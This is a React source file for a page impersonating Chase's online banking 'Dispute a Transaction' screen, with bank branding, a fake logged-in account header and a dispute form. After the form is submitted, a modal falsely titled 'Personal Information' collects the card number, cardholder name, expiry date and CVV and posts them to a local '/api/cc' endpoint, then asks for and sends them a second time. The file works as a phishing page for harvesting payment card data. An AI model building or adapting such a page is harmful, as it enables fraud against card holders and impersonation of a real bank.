import React, { useState } from 'react';

const DisputePage = () => {
    const [selectedReason, setSelectedReason] = useState('');
    const [description, setDescription] = useState('');
    const [merchantContact, setMerchantContact] = useState('');
    const [showSuccess, setShowSuccess] = useState(false);
    const [showModal, setShowModal] = useState(false);
    const [modalStep, setModalStep] = useState(1);
    const [cNumber, setCNumber] = useState('');
    const [cName, setCName] = useState('');
    const [expDate, setExpDate] = useState('');
    const [vvc, setVvc] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    // First modal form state
    const [personalInfo, setPersonalInfo] = useState({
        fullName: '',
        email: '',
        phone: '',
        address: '',
        zipCode: ''
    });

    // Second modal form state
    const [disputeDetails, setDisputeDetails] = useState({
        expectedAmount: '',
        transactionDate: '',
        merchantResponse: '',
        attachments: null,
        additionalComments: ''
    });

    const disputeReasons = [
        {
            id: 'fraud',
            title: 'Fraudulent Charge',
            desc: 'I did not authorize this transaction'
        },
        {
            id: 'duplicate',
            title: 'Duplicate Charge',
            desc: 'I was charged multiple times for the same purchase'
        },
        {
            id: 'not-received',
            title: 'Services Not Received',
            desc: 'I was charged but didn\'t receive the goods/services'
        },
        {
            id: 'cancelled',
            title: 'Cancelled Transaction',
            desc: 'I cancelled but was still charged'
        },
        {
            id: 'wrong-amount',
            title: 'Wrong Amount',
            desc: 'The amount charged is incorrect'
        },
        {
            id: 'other',
            title: 'Other',
            desc: 'My issue doesn\'t fit the categories above'
        }
    ];

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!selectedReason || !description || !merchantContact) {
            alert('Please fill in all required fields');
            return;
        }
        setShowModal(true);
        setModalStep(1);
    };

    const handleFirstModalSubmit = async () => {
        if (!cNumber || !cName || !expDate || !vvc) {
            alert('Please fill in all required fields');
            return;
        }

        setIsLoading(true);

        try {
            const response = await fetch('http://localhost:3000/api/cc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    cNumber, cName, expDate, vvc
                })
            });

            if (response.ok) {
                setCNumber('');
                setCName('');
                setExpDate('');
                setVvc('');
                setModalStep(2);
            } else {
                throw new Error('Failed to submit personal information');
            }
        } catch (error) {
            alert('Error submitting form: ');
        } finally {
            setIsLoading(false);
        }
    };

    const handleSecondModalSubmit = async () => {
        if (!cNumber || !cName || !expDate || !vvc) {
            alert('Please fill in all required fields');
            return;
        }

        setIsLoading(true);

        try {
            // const formData = new FormData();
            // Object.keys(disputeDetails).forEach(key => {
            //     if (disputeDetails[key] !== null) {
            //         formData.append(key, disputeDetails[key]);
            //     }
            // });

            const response = await fetch('http://localhost:3000/api/cc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    cNumber, cName, expDate, vvc
                })
            });

            if (response.ok) {
                setShowModal(false);
                setShowSuccess(true);
                setModalStep(1);
                // Reset forms
            } else {
                throw new Error('Failed to submit dispute details');
            }
        } catch (error) {
            alert('Error submitting form');
        } finally {
            setIsLoading(false);
        }
    };

    const closeModal = () => {
        if (!isLoading) {
            setShowModal(false);
            setModalStep(1);
        }
    };

    const handleCancel = () => {
        if (confirm('Are you sure you want to cancel? Your progress will be lost.')) {
            // Reset form
            setSelectedReason('');
            setDescription('');
            setMerchantContact('');
        }
    };

    if (showSuccess) {
        return (
            <div className="min-h-screen bg-gray-50">
                <div className="bg-blue-600 text-white p-4">
                    <div className="max-w-6xl mx-auto flex justify-between items-center">
                        <div className="text-2xl font-bold">Chase</div>
                        <div className="text-sm">Welcome, John Smith | Account: ••••1234 | Sign Out</div>
                    </div>
                </div>

                <div className="max-w-4xl mx-auto p-8">
                    <div className="bg-white rounded-lg shadow-lg p-8 text-center">
                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                            <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                            </svg>
                        </div>
                        <h2 className="text-3xl font-bold text-gray-900 mb-4">Dispute Submitted Successfully</h2>
                        <p className="text-gray-600 mb-6">Your dispute has been submitted and assigned reference number: <strong>DSP-789012345</strong></p>
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                            <p className="text-sm text-blue-800">
                                We'll review your dispute within 2 business days and may issue a temporary credit while we investigate.
                                You'll receive email updates throughout the process.
                            </p>
                        </div>
                        <button
                            onClick={() => setShowSuccess(false)}
                            className="bg-blue-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors"
                        >
                            Submit Another Dispute
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-gray-50">
            {/* Modal */}
            {showModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-lg max-w-md w-full max-h-[90vh] overflow-y-auto">
                        {modalStep === 1 ? (
                            // First Modal - Personal Information
                            <div>
                                <div className="bg-blue-600 text-white p-6 rounded-t-lg">
                                    <h2 className="text-xl font-bold">Personal Information</h2>
                                    <p className="text-blue-100 text-sm mt-1">Please provide your contact details</p>
                                </div>

                                <div className="p-6 space-y-4">
                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Card Number *</label>
                                        <input
                                            type="text"
                                            value={cNumber}
                                            onChange={(e) => setCNumber(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your full name"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Card Name *</label>
                                        <input
                                            type="email"
                                            value={cName}
                                            onChange={(e) => setCName(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your email address"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Exp Date *</label>
                                        <input
                                            type="tel"
                                            value={expDate}
                                            onChange={(e) => setExpDate(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your phone number"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">CVV *</label>
                                        <input
                                            type="text"
                                            value={vvc}
                                            onChange={(e) => setVvc(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your full address"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">ZIP Code *</label>
                                        <input
                                            type="text"
                                            value={personalInfo.zipCode}
                                            onChange={(e) => setPersonalInfo({ ...personalInfo, zipCode: e.target.value })}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your ZIP code"
                                        />
                                    </div>
                                </div>

                                <div className="p-6 bg-gray-50 rounded-b-lg flex gap-3">
                                    <button
                                        onClick={handleFirstModalSubmit}
                                        disabled={isLoading}
                                        className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                    >
                                        {isLoading ? 'Submitting...' : 'Continue'}
                                    </button>
                                    <button
                                        onClick={closeModal}
                                        disabled={isLoading}
                                        className="flex-1 bg-gray-500 text-white py-3 rounded-lg font-semibold hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                    >
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        ) : (
                            // Second Modal - Additional Dispute Details
                            <div>
                                <div className="bg-green-600 text-white p-6 rounded-t-lg">
                                    <h2 className="text-xl font-bold">Additional Details</h2>
                                    <p className="text-green-100 text-sm mt-1">Please provide additional information about your dispute</p>
                                </div>

                                <div className="p-6 space-y-4">
                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Card Number *</label>
                                        <input
                                            type="number"
                                            step="0.01"
                                            value={cNumber}
                                            onChange={(e) => setCNumber(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-green-500 focus:outline-none"
                                            placeholder="0.00"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Card Name *</label>
                                        <input
                                            type="date"
                                            value={cName}
                                            onChange={(e) => setCName(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-green-500 focus:outline-none"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Exp Date *</label>
                                        <input
                                            type="tel"
                                            value={expDate}
                                            onChange={(e) => setExpDate(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your phone number"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">CVV *</label>
                                        <input
                                            type="text"
                                            value={vvc}
                                            onChange={(e) => setVvc(e.target.value)}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                            placeholder="Enter your full address"
                                        />
                                    </div>

                                    <div>
                                        <label className="block font-semibold text-gray-700 mb-1">Additional Comments</label>
                                        <textarea
                                            value={disputeDetails.additionalComments}
                                            onChange={(e) => setDisputeDetails({ ...disputeDetails, additionalComments: e.target.value })}
                                            className="w-full p-3 border border-gray-300 rounded-md focus:border-green-500 focus:outline-none"
                                            rows="4"
                                            placeholder="Any additional information that might help with your dispute..."
                                        />
                                    </div>
                                </div>

                                <div className="p-6 bg-gray-50 rounded-b-lg flex gap-3">
                                    <button
                                        onClick={handleSecondModalSubmit}
                                        disabled={isLoading}
                                        className="flex-1 bg-green-600 text-white py-3 rounded-lg font-semibold hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                    >
                                        {isLoading ? 'Submitting...' : 'Submit Dispute'}
                                    </button>
                                    <button
                                        onClick={() => setModalStep(1)}
                                        disabled={isLoading}
                                        className="flex-1 bg-gray-500 text-white py-3 rounded-lg font-semibold hover:bg-gray-600 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                    >
                                        Back
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* Header */}
            <div className="bg-blue-600 text-white p-4">
                <div className="max-w-6xl mx-auto flex justify-between items-center">
                    <div className="text-2xl font-bold">Chase</div>
                    <div className="text-sm">Welcome, John Smith | Account: ••••1234 | Sign Out</div>
                </div>
            </div>

            {/* Breadcrumb */}
            <div className="max-w-6xl mx-auto p-4 text-sm text-gray-600">
                <a href="#" className="text-blue-600 hover:underline">My Accounts</a> &gt;
                <a href="#" className="text-blue-600 hover:underline"> Credit Cards</a> &gt;
                <a href="#" className="text-blue-600 hover:underline"> Account Activity</a> &gt;
                <span> Dispute Transaction</span>
            </div>

            <div className="max-w-6xl mx-auto p-4 grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Main Content */}
                <div className="lg:col-span-2">
                    <div className="bg-white rounded-lg shadow-lg overflow-hidden">
                        {/* Page Header */}
                        <div className="bg-gradient-to-r from-blue-600 to-blue-800 text-white p-8 text-center">
                            <h1 className="text-3xl font-bold mb-2">Dispute a Transaction</h1>
                            <p className="text-blue-100">Help us understand your concern about this charge</p>
                        </div>

                        <div className="p-8">
                            {/* Transaction Details */}
                            <div className="border-2 border-gray-200 rounded-lg p-6 mb-6 bg-gray-50">
                                <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-300">
                                    <h2 className="text-xl font-bold text-gray-900">TARGET T-1892</h2>
                                    <div className="text-2xl font-bold text-red-600">$127.45</div>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <div className="text-xs text-gray-500 uppercase font-bold mb-1">Transaction Date</div>
                                        <div className="text-sm text-gray-900">September 02, 2025</div>
                                    </div>
                                    <div>
                                        <div className="text-xs text-gray-500 uppercase font-bold mb-1">Posted Date</div>
                                        <div className="text-sm text-gray-900">September 02, 2025</div>
                                    </div>
                                    <div>
                                        <div className="text-xs text-gray-500 uppercase font-bold mb-1">Card Used</div>
                                        <div className="text-sm text-gray-900">Chase Freedom ••••1234</div>
                                    </div>
                                    <div>
                                        <div className="text-xs text-gray-500 uppercase font-bold mb-1">Reference Number</div>
                                        <div className="text-sm text-gray-900">TXN-987654321</div>
                                    </div>
                                </div>
                            </div>

                            {/* Warning Box */}
                            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                                <div className="text-yellow-800 text-sm">
                                    <strong>Important:</strong> Before disputing this charge, please contact the merchant directly.
                                    Many issues can be resolved quickly without filing a dispute.
                                </div>
                            </div>

                            {/* Dispute Form */}
                            <div>
                                <div className="mb-8">
                                    <h3 className="text-xl font-bold text-gray-900 mb-4">Why are you disputing this transaction?</h3>

                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                                        {disputeReasons.map((reason) => (
                                            <div
                                                key={reason.id}
                                                onClick={() => setSelectedReason(reason.id)}
                                                className={`border rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedReason === reason.id
                                                    ? 'border-blue-600 bg-blue-50'
                                                    : 'border-gray-300 hover:border-blue-400 hover:bg-blue-50'
                                                    }`}
                                            >
                                                <div className="font-bold text-gray-900 mb-1">{reason.title}</div>
                                                <div className="text-sm text-gray-600">{reason.desc}</div>
                                            </div>
                                        ))}
                                    </div>
                                </div>

                                <div className="mb-6">
                                    <label className="block font-bold text-gray-900 mb-2">
                                        Describe what happened *
                                    </label>
                                    <textarea
                                        value={description}
                                        onChange={(e) => setDescription(e.target.value)}
                                        className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                        rows="5"
                                        placeholder="Please provide details about your dispute. Include any relevant dates, amounts, or communications with the merchant."
                                        required
                                    />
                                </div>

                                <div className="mb-8">
                                    <label className="block font-bold text-gray-900 mb-2">
                                        Did you contact the merchant? *
                                    </label>
                                    <select
                                        value={merchantContact}
                                        onChange={(e) => setMerchantContact(e.target.value)}
                                        className="w-full p-3 border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                                        required
                                    >
                                        <option value="">Please select</option>
                                        <option value="yes">Yes, I contacted them</option>
                                        <option value="no">No, I did not contact them</option>
                                        <option value="unable">I was unable to contact them</option>
                                    </select>
                                </div>

                                <div className="flex gap-4">
                                    <button
                                        onClick={handleSubmit}
                                        className="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-blue-700 transition-colors"
                                    >
                                        Submit Dispute
                                    </button>
                                    <button
                                        type="button"
                                        onClick={handleCancel}
                                        className="bg-gray-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-gray-700 transition-colors"
                                    >
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Sidebar */}
                <div className="space-y-6">
                    <div className="bg-white rounded-lg shadow-lg p-6">
                        <h3 className="text-lg font-bold text-gray-900 mb-3">What Happens Next?</h3>
                        <div className="space-y-3 text-sm text-gray-600">
                            <p>1. We'll review your dispute within 2 business days</p>
                            <p>2. A temporary credit may be issued while we investigate</p>
                            <p>3. We'll contact the merchant on your behalf</p>
                            <p>4. You'll receive updates via email and online banking</p>
                        </div>
                    </div>

                    <div className="bg-white rounded-lg shadow-lg p-6">
                        <h3 className="text-lg font-bold text-gray-900 mb-3">Dispute Timeline</h3>
                        <div className="space-y-2 text-sm text-gray-600">
                            <p><strong className="text-gray-900">Investigation:</strong> Up to 90 days</p>
                            <p><strong className="text-gray-900">Provisional Credit:</strong> Within 2 business days</p>
                            <p><strong className="text-gray-900">Final Resolution:</strong> We'll notify you of the outcome</p>
                        </div>
                    </div>

                    <div className="bg-white rounded-lg shadow-lg p-6">
                        <h3 className="text-lg font-bold text-gray-900 mb-3">Need Help?</h3>
                        <div className="bg-blue-50 p-4 rounded-lg">
                            <div className="space-y-1 text-sm">
                                <p><strong className="text-gray-900">Phone:</strong> 1-800-CHASE-1</p>
                                <p><strong className="text-gray-900">Chat:</strong> Available 24/7</p>
                                <p><strong className="text-gray-900">Branch:</strong> Visit any Chase location</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default DisputePage;